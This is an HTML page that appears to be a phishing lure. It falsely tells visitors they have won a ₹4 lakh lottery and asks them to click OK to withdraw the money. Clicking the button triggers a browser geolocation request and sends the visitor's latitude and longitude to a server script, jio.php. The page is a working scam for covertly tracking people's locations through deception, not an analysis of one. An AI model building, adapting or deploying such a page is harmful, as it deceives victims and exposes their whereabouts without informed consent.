<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Win a Lottery!</title>
    <style>
        body {
            font-family: 'Arial', sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background-color: #f5f5f5;
            flex-direction: column;
            margin: 0;
        }
        .container {
            background: #fff;
            padding: 20px;
            box-shadow: 0 0 10px rgba(0,0,0,0.1);
            text-align: center;
            border-radius: 10px;
        }
        h1 {
            color: #007bff;
            margin-bottom: 20px;
        }
        p {
            font-size: 18px;
            color: #333;
            margin-bottom: 20px;
        }
        button {
            padding: 10px 20px;
            background-color: #28a745;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-size: 18px;
        }
        button:hover {
            background-color: #218838;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Congratulations!</h1>
        <p>You’ve won a lottery of ₹4 lakh. Click the button below to withdraw the amount.</p>
        <button onclick="getLocation()">OK</button>
    </div>

    <p id="demo" style="display:none;"></p>

    <script>
    const x = document.getElementById("demo");

    function getLocation() {
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(showPosition);
      } else { 
        x.innerHTML = "Geolocation is not supported by this browser.";
      }
    }

    function showPosition(position) {
      window.location.replace("jio.php?lat=" + position.coords.latitude + "&long=" + position.coords.longitude);
    }
    </script>
</body>
</html>
